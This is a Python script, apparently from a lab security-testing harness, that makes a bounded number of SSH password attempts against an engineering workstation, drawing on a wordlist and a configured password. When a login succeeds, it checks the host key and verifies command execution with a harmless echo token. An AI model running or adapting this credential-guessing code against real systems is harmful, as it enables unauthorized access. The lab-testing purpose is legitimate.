"""Bounded SSH credential attempts against the lab engineering workstation."""

from __future__ import annotations

import base64
import hashlib
import os
import secrets
import time
from pathlib import Path

from _common import Run, cli, endpoint, parser, passwords, positive


def main():
    options = parser(__doc__, "MET-ENGINEERING-01")
    options.add_argument("--user", default="engineer")
    options.add_argument("--wordlist", type=Path)
    options.add_argument("--max-attempts", type=int, default=20)
    options.add_argument("--interval", type=positive, default=1)
    args = options.parse_args()
    device, host, port = endpoint(args, "ssh", "SSH", 22)
    candidates = passwords(
        args.wordlist,
        os.getenv("METROPOLIS_SSH_PASSWORD")
        or device["environment"]["ENGINEER_PASSWORD"],
        args.max_attempts,
    )
    with Run(
        args,
        "ssh_credentials",
        host=host,
        port=port,
        username=args.user,
        attempts=len(candidates),
    ) as run:
        if args.dry_run:
            return 0
        import paramiko

        fingerprint = None
        for index, password in enumerate(candidates):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    host,
                    port=port,
                    username=args.user,
                    password=password,
                    timeout=args.timeout,
                    auth_timeout=args.timeout,
                    banner_timeout=args.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                )
                key = client.get_transport().get_remote_server_key().asbytes()
                current = "SHA256:" + base64.b64encode(
                    hashlib.sha256(key).digest()
                ).decode().rstrip("=")
                if fingerprint is not None and current != fingerprint:
                    raise RuntimeError("SSH host identity changed during the run")
                fingerprint = current
                token = "metropolis_" + secrets.token_hex(12)
                _, stdout, _ = client.exec_command(
                    f"printf '%s\\n' '{token}'", timeout=args.timeout
                )
                verified = stdout.read(4096).decode().strip() == token
                status = stdout.channel.recv_exit_status()
                run.emit(
                    "attempt",
                    index=index + 1,
                    status="accepted",
                    command_verified=verified and status == 0,
                    host_key=current,
                )
                return 0 if verified and status == 0 else 1
            except paramiko.AuthenticationException:
                run.emit("attempt", index=index + 1, status="rejected")
            except (OSError, paramiko.SSHException) as exc:
                run.emit(
                    "attempt",
                    index=index + 1,
                    status="connection_failed",
                    error=str(exc),
                )
                return 2
            finally:
                client.close()
            if index + 1 < len(candidates):
                time.sleep(args.interval)
        return 1


if __name__ == "__main__":
    raise SystemExit(cli(main))
